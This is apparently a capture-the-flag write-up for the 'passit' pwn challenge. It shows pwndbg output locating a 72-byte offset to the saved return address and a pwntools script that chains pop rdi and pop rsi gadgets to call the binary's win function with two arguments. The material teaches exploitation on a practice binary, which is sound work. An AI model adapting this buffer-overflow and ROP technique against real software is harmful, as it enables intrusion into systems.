---
layout: post
date: 2025-07-25 12:23:00 +0300
categories: NCSC-2025 pwn
title: passit
tags: x64 ret2win buffer-overflow ROP
---

## Information
- category: pwn
- points: 1000

## Description
> None

## Write-up
This challenge is similar to the classic `baby` pwn challenge but with an important twist: the `win` function requires two parameters (`parm1` and `parm2`) to be set correctly to successfully get the flag. From reversing the binary (see the screenshot below), we can see the function prototype for `win` accepts two arguments. This means a simple return-to-`win` (ret2win) without setting those parameters won’t work:

<img src="/images/baby/Shot-2025-07-26-034940.png" style="border-radius: 14px;">

To craft a proper exploit, we first need to find the exact offset from the input buffer to the saved return address on the stack. Using `pwndbg`, we set a breakpoint right before the vulnerable `fgets` call, which reads user input into the buffer. At this breakpoint, registers and stack pointers give us crucial information about the stack layout. From the debugger output:
```plaintext
Stack level 0, frame at 0x7fffffffdf40:
 rip = 0x401310 in vuln; saved rip = 0x401369
 called by frame at 0x7fffffffdf50
 ...
pwndbg> dist $rax 0x7fffffffdf38
0x7fffffffdef0->0x7fffffffdf38 is 0x48 bytes (0x9 words)
```

-  `$rax` points to the buffer start at `0x7fffffffdef0`. 
-  The saved return address (RIP) is stored at `0x7fffffffdf38`.
-  Calculating the distance between these addresses: `0x7fffffffdf38 - 0x7fffffffdef0 = 0x48` bytes (72 bytes). 


This tells us the return address lies 72 bytes after the start of the buffer. Therefore, to overwrite the return address, we need to overflow the buffer with 72 bytes of filler, then overwrite the next 8 bytes (on x86\_64) with our desired return address.

## Exploit
```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./passit_patched")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("")

    return r


def main():
    r = conn()

    pop_rdi = 0x401196
    pop_rsi = 0x401199
    ret = 0x401016
    payload = b"A" * 72 + p64(ret) 
    payload+= p64(pop_rdi) + p64(0x435343434e0000) 
    payload+= p64(pop_rsi) + p64(0x5a44494b530000)  
    payload+= p64(exe.symbols.win)

    r.send(payload)
    r.interactive()


if __name__ == "__main__":
    main()
```

## Flag
> Flag:``` ```




